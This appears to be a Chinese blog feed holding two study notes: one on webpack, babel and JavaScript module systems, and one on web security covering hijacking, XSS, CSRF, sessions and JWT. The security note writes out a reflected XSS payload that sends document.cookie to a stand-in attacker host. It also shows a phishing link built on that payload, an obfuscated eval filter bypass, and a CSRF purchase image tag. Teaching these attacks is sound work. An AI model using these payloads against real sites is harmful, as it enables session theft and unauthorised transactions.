class="hljs-string">"^5.45.1"</span>,    <span class="hljs-string">"webpack-cli"</span>: <span class="hljs-string">"^4.7.2"</span>  &#125;&#125;</code></pre></div></li><li><p>新建webpack.config.js文件，添加webpack的配置：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);<span class="hljs-built_in">module</span>.exports = &#123;    mode: <span class="hljs-string">'development'</span>, <span class="hljs-comment">// production 开发/生产环境</span>    entry: path.join(__dirname, <span class="hljs-string">'src'</span>, <span class="hljs-string">'index.js'</span>), <span class="hljs-comment">// 入口文件 __dirname为当前目录</span>    output: &#123;        filename: <span class="hljs-string">'bundle.js'</span>,        path: path.join(__dirname, <span class="hljs-string">'dist'</span>)    &#125;&#125;</code></pre></div><p>之后在package.json中添加运行命令：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-string">"scripts"</span>: &#123;    <span class="hljs-string">"test"</span>: <span class="hljs-string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span>,    <span class="hljs-string">"build"</span>: <span class="hljs-string">"webpack --config webpack.config.js"</span> <span class="hljs-comment">// 或者"webpack“ 也可</span>&#125;</code></pre></div></li></ul><p>打包好的bundle.js是怎么用的？是需要html文件调用，在src目录下也有写好的html文件（注意这个html并不需要用script引入index.js），使用html-webpack-plugin整合，之后用webpack-dev-server启动本地服务进行调试</p><ul><li><p>webpack配置：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);<span class="hljs-keyword">const</span> HtmlWebpackPlugin = <span class="hljs-built_in">require</span>(<span class="hljs-string">'html-webpack-plugin'</span>);<span class="hljs-built_in">module</span>.exports = &#123;    mode: <span class="hljs-string">'development'</span>, <span class="hljs-comment">// production 开发/生产环境</span>    entry: path.join(__dirname, <span class="hljs-string">'src'</span>, <span class="hljs-string">'index.js'</span>), <span class="hljs-comment">// 入口文件 __dirname为当前目录</span>    output: &#123;        filename: <span class="hljs-string">'bundle.js'</span>,        path: path.join(__dirname, <span class="hljs-string">'dist'</span>)    &#125;,    plugins: [        <span class="hljs-keyword">new</span> HtmlWebpackPlugin(&#123;            template: path.join(__dirname, <span class="hljs-string">'src'</span>, <span class="hljs-string">'index.html'</span>),            filename: <span class="hljs-string">'index.html'</span> <span class="hljs-comment">// 根据模板产出的html，会放在dist文件夹中</span>        &#125;)    ],    devServer: &#123;        port: <span class="hljs-number">3000</span>,        contentBase: path.join(__dirname, <span class="hljs-string">'dist'</span>)    &#125;&#125;</code></pre></div></li><li><p>package.json配置：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-string">"scripts"</span>: &#123;    <span class="hljs-string">"test"</span>: <span class="hljs-string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span>,    <span class="hljs-string">"build"</span>: <span class="hljs-string">"webpack"</span>,    <span class="hljs-string">"dev"</span>: <span class="hljs-string">"webpack-dev-server --config webpack.config.js"</span> <span class="hljs-comment">// 与上同理</span>&#125;</code></pre></div></li></ul><p>以上是开发环境，webpack生产环境的配置可以新建一个webpack.prod.js：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);<span class="hljs-keyword">const</span> HtmlWebpackPlugin = <span class="hljs-built_in">require</span>(<span class="hljs-string">'html-webpack-plugin'</span>);<span class="hljs-built_in">module</span>.exports = &#123;    mode: <span class="hljs-string">'production'</span>, <span class="hljs-comment">// 压缩代码</span>    entry: path.join(__dirname, <span class="hljs-string">'src'</span>, <span class="hljs-string">'index.js'</span>), <span class="hljs-comment">// 入口文件 __dirname为当前目录</span>    output: &#123;        filename: <span class="hljs-string">'bundle[contenthash].js'</span>, <span class="hljs-comment">// 打包的文件后缀一个hash值</span>        path: path.join(__dirname, <span class="hljs-string">'dist'</span>)    &#125;,    <span class="hljs-built_in">module</span>: &#123;        rules:[            &#123;                test: <span class="hljs-regexp">/\.js$/</span>, <span class="hljs-comment">// 先验证是否是js文件</span>                loader: [<span class="hljs-string">'babel-loader'</span>], <span class="hljs-comment">// 对这些文件都过这些loader</span>                include: path.join(__dirname, <span class="hljs-string">'src'</span>), <span class="hljs-comment">// 包含哪些目录做loader</span>                exclude: <span class="hljs-regexp">/node_modules/</span> <span class="hljs-comment">// 排除那些目录</span>            &#125;        ]    &#125;,    plugins: [        <span class="hljs-keyword">new</span> HtmlWebpackPlugin(&#123;            template: path.join(__dirname, <span class="hljs-string">'src'</span>, <span class="hljs-string">'index.html'</span>),            filename: <span class="hljs-string">'index.html'</span> <span class="hljs-comment">// 根据模板产出的html，会放在dist文件夹中</span>        &#125;)    ]&#125;</code></pre></div><p>记得package.json中写一个新命令：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-string">"build_prod"</span>: <span class="hljs-string">"webpack --config webpack.prod.js"</span></code></pre></div><h2 id="babel"><a href="#babel" class="headerlink" title="babel"></a>babel</h2><p>会发现bundle.js中依然是ES6的代码，而实际上有些浏览器不支持这种语法，需要将ES6转为ES5，babel可以完成这个任务，它与webpack是两个东西，webpack是用来打包的工具，而babel提供了一些插件给webpack，本身是做ES的高级语法向低级语法转变的工具。</p><div class="hljs"><pre><code class="hljs javascript">npm install @babel/core @babel/preset-env babel-loader -D</code></pre></div><blockquote><p>@babel 一个组</p><p>/xxx @babel中的一个模块</p><p>babel-loader 给webpack的插件</p></blockquote><p>需要在目录下有一个<code>.babelrc</code>文件：</p><div class="hljs"><pre><code class="hljs javascript">&#123;<span class="hljs-string">"presets"</span>: [<span class="hljs-string">"@babel/preset-env"</span>]&#125;</code></pre></div><p>然后在webpack的配置文件中添加规则：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-built_in">module</span>: &#123;rules:[&#123;test: <span class="hljs-regexp">/\.js$/</span>, <span class="hljs-comment">// 先验证是否是js文件</span>loader: [<span class="hljs-string">'babel-loader'</span>], <span class="hljs-comment">// 对这些文件都过这些loader</span>include: path.join(__dirname, <span class="hljs-string">'src'</span>), <span class="hljs-comment">// 包含哪些目录做loader</span>exclude: <span class="hljs-regexp">/node_modules/</span> <span class="hljs-comment">// 排除那些目录</span>&#125;]&#125;</code></pre></div><h2 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h2><h3 id="什么是模块？"><a href="#什么是模块？" class="headerlink" title="什么是模块？"></a>什么是模块？</h3><ul><li>将一个复杂的程序依据一定的规则(规范)封装成几个块(文件), 并进行组合在一起</li><li>块的内部数据与实现是私有的, 只是向外部暴露一些接口(方法)与外部其它模块通信</li></ul><h3 id="模块化的好处"><a href="#模块化的好处" class="headerlink" title="模块化的好处"></a>模块化的好处</h3><ul><li>避免命名冲突(减少命名空间污染)</li><li>更好的分离, 按需加载</li><li>更高复用性</li><li>高可维护性</li></ul><h3 id="引入多个script（模块）后出现的问题"><a href="#引入多个script（模块）后出现的问题" class="headerlink" title="引入多个script（模块）后出现的问题"></a>引入多个script（模块）后出现的问题</h3><ul><li><p>请求过多</p><p>首先我们要依赖多个模块，那样就会发送多个请求，导致请求过多</p></li><li><p>依赖模糊</p><p>不知道他们的具体依赖关系是什么，也就是说很容易因为不了解他们之间的依赖关系导致加载先后顺序出错。</p></li><li><p>难以维护</p><p>以上两种原因就导致了很难维护，很可能出现牵一发而动全身的情况导致项目出现严重的问题。<br>模块化固然有多个好处，然而一个页面需要引入多个js文件，就会出现以上这些问题。而这些问题可以通过模块化规范来解决。</p></li></ul><h3 id="模块化规范"><a href="#模块化规范" class="headerlink" title="模块化规范"></a>模块化规范</h3><h4 id="CommonJS"><a href="#CommonJS" class="headerlink" title="CommonJS"></a>CommonJS</h4><p>Node 应用由模块组成，采用 CommonJS 模块规范。每个文件就是一个模块，有自己的作用域。在一个文件里面定义的变量、函数、类，都是私有的，对其他文件不可见。<strong>在服务器端，模块的加载是运行时同步加载的；在浏览器端，模块需要提前编译打包处理</strong></p><ul><li>暴露模块：<code>module.exports = value</code>或<code>exports.xxx = value</code></li><li>引入模块：<code>require(xxx)</code>,如果是第三方模块，xxx为模块名；如果是自定义模块，xxx为模块文件路径</li></ul><p><strong>CommonJS暴露的模块到底是什么?</strong> </p><p>CommonJS规范规定，每个模块内部，module变量代表当前模块。这个变量是一个对象，它的exports属性（即module.exports）是对外的接口。<strong>加载某个模块，其实是加载该模块的module.exports属性</strong>，这个属性是一个对象：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> x = <span class="hljs-number">5</span>;<span class="hljs-keyword">var</span> addX = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">value</span>) </span>&#123;  <span class="hljs-keyword">return</span> value + x;&#125;;<span class="hljs-built_in">module</span>.exports.x = x;<span class="hljs-built_in">module</span>.exports.addX = addX;</code></pre></div><p>所以require命令的基本功能是，读入并执行一个JavaScript文件，然后返回该模块的exports对象。如果没有发现指定模块，会报错。</p><p>需要注意的点：</p><ul><li><p>对于基本数据类型，属于复制。即会被模块缓存。同时，在另一个模块可以对该模块输出的变量重新赋值</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">// b.js</span><span class="hljs-keyword">let</span> count = <span class="hljs-number">1</span><span class="hljs-keyword">let</span> plusCount = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;  count++&#125;setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'b.js-1'</span>, count)&#125;, <span class="hljs-number">1000</span>)<span class="hljs-built_in">module</span>.exports = &#123;  count,  plusCount&#125;<span class="hljs-comment">// a.js</span><span class="hljs-keyword">let</span> mod = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./b.js'</span>)<span class="hljs-built_in">console</span>.log(<span class="hljs-string">'a.js-1'</span>, mod.count)mod.plusCount()<span class="hljs-built_in">console</span>.log(<span class="hljs-string">'a.js-2'</span>, mod.count)setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;    mod.count = <span class="hljs-number">3</span>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'a.js-3'</span>, mod.count)&#125;, <span class="hljs-number">2000</span>)node a.jsa.js<span class="hljs-number">-1</span> <span class="hljs-number">1</span>a.js<span class="hljs-number">-2</span> <span class="hljs-number">1</span>b.js<span class="hljs-number">-1</span> <span class="hljs-number">2</span>  <span class="hljs-comment">// 1秒后</span>a.js<span class="hljs-number">-3</span> <span class="hljs-number">3</span>  <span class="hljs-comment">// 2秒后</span></code></pre></div><p>可以看出，b模块export的count变量，是一个复制。在plusCount方法调用之后，a模块中的count不受影响。同时，可以在a模块中用b导出的函数更改b模块中的值。如果希望能够同步代码，可以export出去一个getter函数。</p></li><li><p>对于复杂数据类型，属于浅拷贝。由于两个模块引用的对象指向同一个内存空间，因此对该模块的值做修改时会影响另一个模块</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">// b.js</span><span class="hljs-keyword">let</span> obj = &#123;  count: <span class="hljs-number">1</span>&#125;<span class="hljs-keyword">let</span> plusCount = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;  obj.count++&#125;setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'b.js-1'</span>, obj.count)&#125;, <span class="hljs-number">1000</span>)setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'b.js-2'</span>, obj.count)&#125;, <span class="hljs-number">3000</span>)<span class="hljs-built_in">module</span>.exports = &#123;  obj,  plusCount&#125;<span class="hljs-comment">// a.js</span><span class="hljs-keyword">var</span> mod = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./b.js'</span>)<span class="hljs-built_in">console</span>.log(<span class="hljs-string">'a.js-1'</span>, mod.obj.count)mod.plusCount()<span class="hljs-built_in">console</span>.log(<span class="hljs-string">'a.js-2'</span>, mod.obj.count)setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;  mod.obj.count = <span class="hljs-number">3</span>  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'a.js-3'</span>, mod.obj.count)&#125;, <span class="hljs-number">2000</span>)node a.jsa.js<span class="hljs-number">-1</span> <span class="hljs-number">1</span>a.js<span class="hljs-number">-2</span> <span class="hljs-number">2</span>b.js<span class="hljs-number">-1</span> <span class="hljs-number">2</span>a.js<span class="hljs-number">-3</span> <span class="hljs-number">3</span>b.js<span class="hljs-number">-2</span> <span class="hljs-number">3</span></code></pre></div></li><li><p>当使用require命令加载某个模块时，就会运行整个模块的代码，并且用require命令加载同一个模块时，不会再执行该模块，而是取到缓存之中的值。也就是说，CommonJS模块无论加载多少次，都只会在第一次加载时运行一次，以后再加载，就返回第一次运行的结果，除非手动清除系统缓存。<strong>值得注意的是，循环加载</strong>时，属于加载时执行。即脚本代码在require的时候，就会全部执行。一旦出现某个模块被”循环加载”，就只输出已经执行的部分，还未执行的部分不会输出：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">// b.js</span>exports.done = <span class="hljs-literal">false</span><span class="hljs-keyword">let</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./a.js'</span>)<span class="hljs-built_in">console</span>.log(<span class="hljs-string">'b.js-1'</span>, a.done)exports.done = <span class="hljs-literal">true</span><span class="hljs-built_in">console</span>.log(<span class="hljs-string">'b.js-2'</span>, <span class="hljs-string">'执行完毕'</span>)<span class="hljs-comment">// a.js</span>exports.done = <span class="hljs-literal">false</span><span class="hljs-keyword">let</span> b = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./b.js'</span>)<span class="hljs-built_in">console</span>.log(<span class="hljs-string">'a.js-1'</span>, b.done)exports.done = <span class="hljs-literal">true</span><span class="hljs-built_in">console</span>.log(<span class="hljs-string">'a.js-2'</span>, <span class="hljs-string">'执行完毕'</span>)<span class="hljs-comment">// c.js</span><span class="hljs-keyword">let</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./a.js'</span>)<span class="hljs-keyword">let</span> b = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./b.js'</span>)<span class="hljs-built_in">console</span>.log(<span class="hljs-string">'c.js-1'</span>, <span class="hljs-string">'执行完毕'</span>, a.done, b.done)node c.jsb.js<span class="hljs-number">-1</span> <span class="hljs-literal">false</span>b.js<span class="hljs-number">-2</span> 执行完毕a.js<span class="hljs-number">-1</span> <span class="hljs-literal">true</span>a.js<span class="hljs-number">-2</span> 执行完毕c.js<span class="hljs-number">-1</span> 执行完毕 <span class="hljs-literal">true</span> <span class="hljs-literal">true</span></code></pre></div><blockquote><p>1.执行c模块。此时遇到require关键字，执行a.js中所有代码。<br>2.在a模块中exports之后，通过require引入了b模块，执行b模块的代码。<br>3.在b模块中exports之后，又require引入了a模块，此时执行a模块的代码。<br>4.a模块执行exports.done = false发现要回b，判断是模块循环，所以对b只输出第一句。<br>5.回到b模块，打印b.js-1 false,  b.js-2，执行完毕。<br>6.回到a模块，接着打印a.js-1 true,  a.js-2，执行完毕<br>7.回到c模块，接着执行require，需要引入b模块。由于在a模块中已经引入过了，所以不会再次打印上面这些内容，也就是没有执行，直接缓存取值就可以。<br>结束。</p></blockquote></li></ul><h4 id="ES6模块化"><a href="#ES6模块化" class="headerlink" title="ES6模块化"></a>ES6模块化</h4><p>ES6 模块的设计思想是尽量的静态化，使得编译时就能确定模块的依赖关系，以及输入和输出的变量。CommonJS只能在运行时确定这些东西，CommonJS 模块就是对象，输入时必须查找对象属性。</p><ul><li>输出：export / export default</li><li>引入：import</li></ul><p>需要注意的点：</p><ul><li><p>ES6 模块输出的是值的引用：ES6 模块的运行机制与 CommonJS 不一样。ES6 模块是动态引用，并且是<strong>动态只读引用</strong>，并且不会缓存值，模块里面的变量绑定其所在的模块。也就是说，import的变量是只读的，不论是基本数据类型还是复杂数据类型。当模块遇到import命令时，就会生成一个只读引用。等到脚本真正执行时，再根据这个只读引用，到被加载的那个模块里面去取值，并且是动态的，原始值发生变化，import加载的值也会发生变化。不论是基本数据类型还是复杂数据类型。但是！！这玩意的只读是类似与const，如果只是++，或者给对象增加属性，不会报错。</p></li><li><p>循环引用时，因为是动态引用，用到啥再去对应的模块找就可以了</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">// b.js</span><span class="hljs-keyword">import</span> &#123;foo&#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'./a.js'</span>;<span class="hljs-keyword">export</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bar</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'bar'</span>);  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Math</span>.random() &gt; <span class="hljs-number">0.5</span>) &#123;    foo();  &#125;&#125;<span class="hljs-comment">// a.js</span><span class="hljs-keyword">import</span> &#123;bar&#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'./b.js'</span>;<span class="hljs-keyword">export</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'foo'</span>);  bar();  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'执行完毕'</span>);&#125;foo();babel-node a.jsfoobar执行完毕<span class="hljs-comment">// 执行结果也有可能是</span>foobarfoobar执行完毕执行完毕</code></pre></div></li><li><p>CommonJS 模块是运行时加载，ES6 模块是编译时输出接口</p><p>因为 CommonJS 加载的是一个对象（即module.exports属性），该对象只有在脚本运行完才会生成。而 ES6 模块不是对象，它的对外接口只是一种静态定义，在代码静态解析阶段就会生成。举个例子：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">// CommonJS模块</span><span class="hljs-keyword">let</span> &#123; stat, exists, readFile &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>); <span class="hljs-comment">// 等同于</span><span class="hljs-keyword">let</span> _fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);<span class="hljs-keyword">let</span> stat = _fs.stat;<span class="hljs-keyword">let</span> exists = _fs.exists;<span class="hljs-keyword">let</span> readfile = _fs.readfile;</code></pre></div><p>上面代码的实质是整体加载fs模块（即加载fs的所有方法），生成一个对象（_fs），然后再从这个对象上面读取 3 个方法。这种加载称为“运行时加载”，因为只有运行时才能得到这个对象，导致完全没办法在编译时做“静态优化”。</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; stat, exists, readFile &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'fs'</span>;</code></pre></div><p>上面代码的实质是从fs模块加载 3 个方法，其他方法不加载。这种加载称为“编译时加载”或者静态加载，即 ES6 可以在编译时就完成模块加载，效率要比 CommonJS 模块的加载方式高（ES6 模块不是对象，而是通过export命令显式指定输出的代码，再通过import命令输入。）</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;webpack、babel与模块化&quot;&gt;&lt;a href=&quot;#webpack、babel与模块化&quot; class=&quot;headerlink&quot; title=&quot;webpack、babel与模块化&quot;&gt;&lt;/a&gt;webpack、babel与模块化&lt;/h1&gt;&lt;p&gt;原因：&lt;/p&gt;
&lt;u</summary>
      
    
    
    
    <category term="前端八股文" scheme="http://yoursite.com/categories/%E5%89%8D%E7%AB%AF%E5%85%AB%E8%82%A1%E6%96%87/"/>
    
    
    <category term="前端面试" scheme="http://yoursite.com/tags/%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95/"/>
    
    <category term="前端工程化" scheme="http://yoursite.com/tags/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Web安全</title>
    <link href="http://yoursite.com/2021/06/05/Web%E5%AE%89%E5%85%A8/"/>
    <id>http://yoursite.com/2021/06/05/Web%E5%AE%89%E5%85%A8/</id>
    <published>2021-06-05T13:05:28.000Z</published>
    <updated>2021-07-29T16:43:34.655Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web安全"><a href="#Web安全" class="headerlink" title="Web安全"></a>Web安全</h1><p><strong><em>Tips：本科信安，，这应该算是俺的老本行了。。</em></strong></p><h2 id="劫持"><a href="#劫持" class="headerlink" title="劫持"></a>劫持</h2><h3 id="HTTP劫持"><a href="#HTTP劫持" class="headerlink" title="HTTP劫持"></a>HTTP劫持</h3><p>在运营商的路由器节点上，设置协议检测，一旦发现是HTTP请求，而且是html类型请求，则拦截处理。后续做法往往分为2种，1种是类似DNS劫持返回302让用户浏览器跳转到另外的地址，还有1种是在服务器返回的HTML数据中插入js或dom节点（广告）</p><h3 id="DNS劫持"><a href="#DNS劫持" class="headerlink" title="DNS劫持"></a>DNS劫持</h3><p>域名解析给一个错的ip</p><p>在手机端用HTTPDNS解决，实际是自己维护一个地址簿。。</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>xss Cross Site Scripting 跨站脚本攻击</p><h3 id="基于反射的XSS攻击"><a href="#基于反射的XSS攻击" class="headerlink" title="基于反射的XSS攻击"></a>基于反射的XSS攻击</h3><p>假设此时网站有一个搜索框，我们在里面输入了“俺要进攻了”，网页的请求是这样的：</p><div class="hljs"><pre><code class="hljs javascript">xxx.com/search?name=俺要进攻了</code></pre></div><p>之后这个请求返回的信息：您的搜索”俺要进攻了”资源不存在，而这是因为我们输入的只是一段正常的话，如果我们输入一段可以执行的代码呢？比如输入：</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">'铁锅炖自己'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div><p>如果这个网站没有做任何过滤和防护，这段话返回的时候就会在我们的窗口上alert出来，从而执行，如果这样不过瘾，可以试试更危险的：(<a href="http://hack/get)是我们自己的服务器接口，设置允许这个页面跨域" target="_blank" rel="noopener">http://hack/get)是我们自己的服务器接口，设置允许这个页面跨域</a></p><div class="hljs"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.location=<span class="hljs-string">'http://hack/get?cookie='</span>+<span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div><p>这时就能拿到cookie了，但注意其实这一直拿的是自己的cookie，想拿别人的，就群发邮件，总之勾引他们来点下方的链接：（看开头以为是一个淘宝网页，结果把自己cookie泄露了）：</p><div class="hljs"><pre><code class="hljs xquery">taobao.com/search<span class="hljs-built_in">?name</span>=<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.location=<span class="hljs-string">'http://hack/get?cookie='</span>+<span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre></div><p>这就是反射型XSS，依靠一个公共站点返回恶意的脚本在别人的客户端触发执行而进行攻击</p><h3 id="本地网关XSS攻击"><a href="#本地网关XSS攻击" class="headerlink" title="本地网关XSS攻击"></a>本地网关XSS攻击</h3><p>DOM-based or local XSS——基于DOM或本地的XSS攻击，假设我们拿着电脑跑到星巴克，把它网线拔了，然后自己建了一个wifi，勾引别人来连这个免费wifi（没错，360免费wifi在连上后会发现哦我们访问的页面被插入了广告），这个网关可以在我们访问的页面中插入内容，如果是广告那还好，但这种脚本可以是获取私人数据的恶意代码。</p><h3 id="基于存储的XSS攻击"><a href="#基于存储的XSS攻击" class="headerlink" title="基于存储的XSS攻击"></a>基于存储的XSS攻击</h3><p>通过贴吧，博客等地方，发表有恶意脚本的帖子，然后点击了“震惊！！xxx又yyy！！”这种勾引标题的无知的人就会中招，当然，有些网站可能屏蔽了“alert”啊，“eval”这些玩意，但实际上可以这样：</p><div class="hljs"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/javascript"</span>&gt;</span><span class="javascript"><span class="hljs-keyword">var</span> x=<span class="hljs-string">'eva'</span>+<span class="hljs-built_in">String</span>.fromCharCode(<span class="hljs-number">108</span>),y=<span class="hljs-built_in">window</span>,e=<span class="hljs-string">'a'</span>+<span class="hljs-built_in">String</span>.fromCharCode(<span class="hljs-number">108</span>)+<span class="hljs-string">'ert("哈哈哈你又中招了")'</span>;</span><span class="actionscript">y[x][<span class="hljs-string">'call'</span>](<span class="hljs-keyword">this</span>,e);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div><p>x是eval，y是window对象，e是alert(“哈哈哈你又中招了”)，除了y，x和e都是字符串，也就是window.eval(“alert(…)”)</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>cross-site request forgery 跨站请求伪造，与XSS刚好相反，XSS是利用用户对网站的信任，而CSRF利用网站对用户的信任。</p><p>假如淘宝安全机制很松，只要登陆了，在没有关掉浏览器的时候，购买啥的不用重登，也不用输入支付密码二次验证，完全作为一个以通过验证的合法用户。</p><p>此时给这位朋友发送一封邮件，然后骗的深一点，连链接都不发，因为不需要他点，插入一张图片：</p><div class="hljs"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">'http://taobao.com/pay?bookid=100'</span>/&gt;</code></pre></div><p>此时他就完成了购买行为。</p><p>与XSS拿cookie例子不一样，这个是在另一个页面完成的，只要TB那个页面开着没退就行，当然，XSS那个想放img也不是不可以。</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><h4 id="验证HTTP-Referer字段"><a href="#验证HTTP-Referer字段" class="headerlink" title="验证HTTP Referer字段"></a>验证HTTP Referer字段</h4><p>HTTP头有Referer字段，如果发现请求不是自己的taobao.com发来的，而是攻击人的网站，就拒绝请求。</p><p>Referer字段：会告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。</p><h4 id="在请求地址中添加token并验证"><a href="#在请求地址中添加token并验证" class="headerlink" title="在请求地址中添加token并验证"></a>在请求地址中添加token并验证</h4><p>CSRF利用了浏览器发送请求会自动带上cookie</p><p>抵御CSRF攻击的关键在于：在请求中放入攻击者所不能伪造的信息，并且该信息不存在于Cookie之中。鉴于此，系统开发者可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。</p><h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><h3 id="背景："><a href="#背景：" class="headerlink" title="背景："></a>背景：</h3><p>HTTP无状态，所以我们切换页面时如果想保持登陆状态而不用重新输入账号密码，就需要保存一些东西。</p><h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p>用户一旦输入账号密码，服务端生成一个sessionID保存，并在响应头中用set-cookie把这玩意给到浏览器，这样下次用户打开一个新标签页，而且cookie没过期的时候会把这个sessionID发给服务端，服务端校验这个ID就可以了。</p><p>但它的维护给服务端带来很大困扰，因为要在服务端生成sessionID，然后需要存下这玩意，如果用户在一段时间都挤进来，由于负载均衡，这个用户打开新标签页时访问的服务器不一定时他存放sessionID的那台，拿ID就没用了。。当然可以专门放一台服务器用来存ID，或者IP hash来将用户引向正确的服务器</p><p>而事实上，防止csrf，如果强制要求把sessionID加入请求头参数，也可以。</p><h3 id="Json-Web-Token"><a href="#Json-Web-Token" class="headerlink" title="Json Web Token"></a>Json Web Token</h3><p>简称就是JWT，也可以叫做Json令牌，由Header、Payload、Signature构成。</p><p>其中Header由令牌类型（如JWT），签名算法构成：</p><div class="hljs"><pre><code class="hljs json">&#123;  <span class="hljs-attr">"alg"</span>: <span class="hljs-string">"HS256"</span>,  <span class="hljs-attr">"typ"</span>: <span class="hljs-string">"JWT"</span>&#125;</code></pre></div><p>指定类型和签名算法后，Json 块被 Base64Url 编码形成 JWT 的第一部分。</p><p>Payload 中包含一个声明。声明是有关实体（通常是用户）和其他数据的声明。共有三种类型的声明：registered, public 和 private 声明。其中，registered是预定义好的声明，比如签发人，主题，过期时间等。。</p><p>public 声明：公共的声明，可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息，但不建议添加敏感信息，因为该部分在客户端可解密。</p><p>private 声明：自定义声明，旨在在同意使用它们的各方之间共享信息，既不是注册声明也不是公共声明。</p><div class="hljs"><pre><code class="hljs json">&#123;  <span class="hljs-attr">"sub"</span>: <span class="hljs-string">"1234567890"</span>,  <span class="hljs-attr">"name"</span>: <span class="hljs-string">"John Doe"</span>,  <span class="hljs-attr">"admin"</span>: <span class="hljs-literal">true</span>&#125;</code></pre></div><p>然后 payload Json 块会被Base64Url 编码形成 JWT 的第二部分。</p><p>JWT 的第三部分signature是一个签证信息，这个签证信息由三部分组成：</p><ul><li>header (base64后的)</li><li>payload (base64后的)</li><li>secret 签名用的密钥</li></ul><div class="hljs"><pre><code class="hljs lisp">HMACSHA256(  base64UrlEncode(<span class="hljs-name">header</span>) + <span class="hljs-string">"."</span> +  base64UrlEncode(<span class="hljs-name">payload</span>),  secret)</code></pre></div><p><strong>Token的存在作用是让服务器用计算来证明用户是本人，而不是通过查询来证明</strong></p>]]></content>
    
    
      
      
